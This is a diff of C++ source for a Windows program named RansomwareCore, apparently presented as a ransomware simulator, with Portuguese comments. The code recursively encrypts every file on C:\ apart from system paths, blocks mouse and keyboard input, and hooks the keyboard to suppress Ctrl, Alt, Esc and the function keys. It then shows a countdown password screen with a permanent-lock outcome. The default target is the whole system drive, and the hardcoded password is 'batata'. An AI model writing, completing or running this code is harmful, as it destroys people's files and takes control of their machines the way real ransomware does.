@@ -1,3 +1,4 @@
+//opa deixei uma guia com comentarios :3
 #include <iostream>
 #include <fstream>
 #include <filesystem>
@@ -50,7 +51,7 @@ public:
     }
 };
 
-// --- MÓDULO 3: SCANNER DE ARQUIVOS (VERSÃO FINAL CORRIGIDA) ---
+// --- MÓDULO 3: SCANNER DE ARQUIVOS ---
 class FileScanner {
 private:
     CryptoEngine& engine;
@@ -62,30 +63,23 @@ public:
         if (!fs::exists(targetDir)) return;
 
         try {
-            // O segredo está no directory_options para ignorar erros de permissão
-            for (const auto& entry : fs::recursive_directory_iterator(targetDir, fs::directory_options::skip_permission_denied)) {
+            for (auto it = fs::recursive_directory_iterator(targetDir, fs::directory_options::skip_permission_denied);
+                 it != fs::end(it); ++it) {
                 try {
-                    // Verifica se o arquivo é válido e é um arquivo regular
-                    if (fs::is_regular_file(entry.path())) {
-                        std::string pathStr = entry.path().string();
+                    if (it->is_regular_file()) {
+                        std::string pathStr = it->path().string();
 
-                        // Filtros de Segurança
                         if (pathStr.find("Windows") != std::string::npos || 
                             pathStr.find("simulador.exe") != std::string::npos) continue;
 
                         if (pathStr.find(".sys") != std::string::npos || 
                             pathStr.find(".dll") != std::string::npos) continue;
 
-                        engine.processFile(entry.path(), encrypt);
+                        engine.processFile(it->path(), encrypt);
                     }
-                } catch (const std::exception& e) {
-                    // Se um arquivo der erro, ele apenas pula para o próximo
-                    continue; 
-                }
+                } catch (...) { continue; }
             }
-        } catch (const std::exception& e) {
-            // Captura erros do iterador principal (como o invalid_argument)
-        }
+        } catch (...) { }
     }
 };
 
@@ -128,7 +122,6 @@ public:
     void renderUI(const RansomwareCore& core) {
         system("cls"); 
 
-        // Arte ASCII
         setTextColor(12); // Vermelho Brilhante
         std::cout << "\n\n";
         std::cout << " //                                               \n";
@@ -181,9 +174,10 @@ public:
 HHOOK hhkKeyboard = NULL;
 
 LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == 0) { 
+    if (nCode == 0) { // nCode == 0 é o padrão para processar a tecla
         KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
 
+        // Bloqueia: Ctrl, Alt, Shift, Tab, Esc, e F1 até F12
         if (pKeyBoard->vkCode == VK_CONTROL || pKeyBoard->vkCode == VK_MENU || 
             pKeyBoard->vkCode == VK_SHIFT || pKeyBoard->vkCode == VK_TAB || 
             pKeyBoard->vkCode == VK_ESCAPE || (pKeyBoard->scanCode >= VK_F1 && pKeyBoard->scanCode <= VK_F12)) {
@@ -195,9 +189,11 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 // --- MÓDULO 7: MAIN (O ORQUESTRADOR FINAL) ---
 int main() {
-    std::string pastaAlvo = "C:\\"; 
+    // CONFIGURAÇÃO DO ALVO
+    std::string pastaAlvo = "C:\\"; // Mude para pasta de teste primeiro!
     std::string senhaCorreta = "batata";
     
+    // Prioridade Máxima
     SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
 
     RansomwareCore core;
@@ -209,15 +205,20 @@ int main() {
     std::cout << "Alvo: " << pastaAlvo << "\n";
     std::cout << "Aguarde a preparacao...\n";
 
+    // 1. Criptografia
     scanner.scanAndProcess(pastaAlvo, true); 
     std::cout << "[!] Criptografia concluida.\n";
 
+    // 2. Bloqueio de Hardware
     BlockInput(TRUE); 
 
+    // 3. Instalação do Hook de Teclado
     hhkKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);
 
+    // 4. Timer
     std::thread timerThread(&RansomwareCore::startTimer, &core);
 
+    // 5. Loop de Interface
     while (core.getState() != AppState::SUCCESS && core.getState() != AppState::LOCKED_PERMANENTLY) {
         renderer.renderUI(core);
 
@@ -238,8 +239,8 @@ int main() {
         if (core.getTime() < 1) break; 
     }
 
-    // Limpeza
-    UnhookWindowsHookEx(hhkKeyboard);
+    // 6. Limpeza Final
+    if (hhkKeyboard) UnhookWindowsHookEx(hhkKeyboard);
     BlockInput(FALSE); 
 
     if (core.getState() == AppState::LOCKED_PERMANENTLY) {
